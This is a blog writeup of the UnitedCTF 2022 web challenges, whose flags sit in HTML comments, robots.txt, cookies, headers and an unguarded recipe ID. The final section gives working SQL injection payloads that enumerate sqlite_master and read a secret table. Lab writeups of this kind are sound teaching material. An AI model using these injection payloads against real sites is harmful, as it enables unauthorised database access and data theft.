---
layout: post
title: UnitedCTF 2022 Writeup - Web
date: 2022-10-07
type: post
tags:
- Writeup
- Hacking
- UnitedCTF
- CTF
permalink: /2022/10/UnitedCTF/Web
img: 2022/10/UnitedCTF/Web/Web.png
---

## Information à la source

![Information à la source](/assets/images/2022/10/UnitedCTF/Web/InformationALaSource.png "Information à la source")


```
Vous avez vu que la page d'accueil semble encore en construction. La compagnie laisse peut-être trainer ses secrets?

http://coca-cola.ctf.unitedctf.ca/
```

Author: [Deimos](https://github.com/amDeimos666)


I launched a browser and opened the challenge page.

![Site](/assets/images/2022/10/UnitedCTF/Web/Site.png "Site")

The site was very simple. I looked at the source code and the flag was in a comment.

```html
<!-- TODO : FLAG-H4CK1N9-C0C4-C0lA-->
```

Flag: FLAG-H4CK1N9-C0C4-C0lA

## Un site bien caché

![Un site bien caché](/assets/images/2022/10/UnitedCTF/Web/UnSiteBienCache.png "Un site bien caché")

```
Le site semble bien protégé, il est introuvable lorsqu'on le cherche avec un moteur de recherche.

http://coca-cola.ctf.unitedctf.ca/
```

Author: [Deimos](https://github.com/amDeimos666)

The description says that search engines can't find the site. That immediately points to a `robots.txt` file. I opened `http://coca-cola.ctf.unitedctf.ca/robots.txt` and it contained the flag.

```
# FLAG-f0R-hum4n-0n1y

User-agent: *
Disallow: /
```

Flag: FLAG-f0R-hum4n-0n1y

## La recette secrète

![La recette secrète](/assets/images/2022/10/UnitedCTF/Web/LaRecetteSecrete.png "La recette secrète")

```
Bien que vos accès sont restreints vous donnant seulement accès aux recettes en cours de développement, vous avez accepté d’aider le SCRS à soutirer de l’information sur la recette originale de coke. Il vous reste maintenant à acquérir cette information…


http://coca-cola.ctf.unitedctf.ca/
```

Author: [Deimos](https://github.com/amDeimos666)

This one talks about recipes. It says we only have access to the recipes that are being developed. But we need to find the original recipe. 

![Recettes](/assets/images/2022/10/UnitedCTF/Web/Recettes.png "Recettes")

There are two recipes on the site. This is their URLs:
* http://coca-cola.ctf.unitedctf.ca/recette/2
* http://coca-cola.ctf.unitedctf.ca/recette/3

We have recipes 2 and 3. What about recipe 1? I navigate to http://coca-cola.ctf.unitedctf.ca/recette/1 .

![Recette 1](/assets/images/2022/10/UnitedCTF/Web/Recipe1.png "Recette 1")

Flag: FLAG-F0R-Y0UR-3Y35-0N1Y

## Un biscuit avec ça?

![Un biscuit avec ça?](/assets/images/2022/10/UnitedCTF/Web/UnBiscuitAvecCa.png "Un biscuit avec ça?")

```
Une personne vous a dit qu'un secret est dans les cookies, c'est presque comme les biscuits chinois.


http://coca-cola.ctf.unitedctf.ca/
```

Author: [Deimos](https://github.com/amDeimos666)

The description for this one talks about cookies. I opened the dev tools and looked at the site's cookies.

![Cookies](/assets/images/2022/10/UnitedCTF/Web/Cookies.png "Cookies")

Flag: FLAG-N0-F00D-H3R3

## Secret en tête

![Secret en tête](/assets/images/2022/10/UnitedCTF/Web/SecretEnTete.png "Secret en tête")

```
Une personne ayant aussi de la difficulté avec l’administration a accepter de vous aider en vous donnant accès à un super secret. À l'acceuil, elle vous a répondu qu'elle avait de l'information en tête à donner.


http://coca-cola.ctf.unitedctf.ca/
```

Author: [Deimos](https://github.com/amDeimos666)

The description talks about headers, so I opened Burp and checked the header in the site response.

```http
HTTP/1.1 304 Not Modified
x-powered-by: Express
super-secret: FLAG-N0-M0R3-53CR3T
set-cookie: Secret here=FLAG-N0-F00D-H3R3; Path=/
etag: W/"5f8-pico+SlyZ/xyQxzJvO6Z5SUqOXs"
date: Mon, 03 Oct 2022 22:59:05 GMT
keep-alive: timeout=5
connection: close
```

Flag: FLAG-N0-M0R3-53CR3T

## Wisdom 1

![Wisdom 1](/assets/images/2022/10/UnitedCTF/Web/Wisdom1.png "Wisdom 1")

```
Did you check my website? It offers a way to search for inspirational quotes, I hope there's nothing wrong with it, but on the off chance that you might find anything, please be kind and let me know what you found :)

⚠️Note: If you find a flag that doesn't work for Wisdom 1, then it's probably the flag for Wisdom 2, and vice versa.


http://wisdom.ctf.unitedctf.ca/
```

Author: [hfz](https://github.com/hfz1337)

![Site](/assets/images/2022/10/UnitedCTF/Web/SiteWidom1.png "Site")

The site allows searching for quotes. 

I tried basic SQL Injections in the search field. Sending `' or 1 = 1 -- -` returned all the quotes.

Next, I tried to use order by to find out how many columns the query returned `' or 1 = 1 Order By 1 -- -`. It returned 3 columns.

I kept experimenting and found out it was using SQLite.

I extracted the list of tables in the database. 

```sql
aaa' Union Select name, sql from sqlite_master -- -
```

```sql
“CREATE TABLE my_s3cr3t_7abl3 (flag text)” - my_s3cr3t_7abl3

“CREATE TABLE quotes (author text, quote text)” - quotes
```

And then read the flag.

```
aaa' Union Select 1, flag from my_s3cr3t_7abl3 -- -
```

```
“FLAG-th4nk$_f0r_1nj3ct1ng_th3_v4x” - 1
```

Flag: FLAG-th4nk$_f0r_1nj3ct1ng_th3_v4x
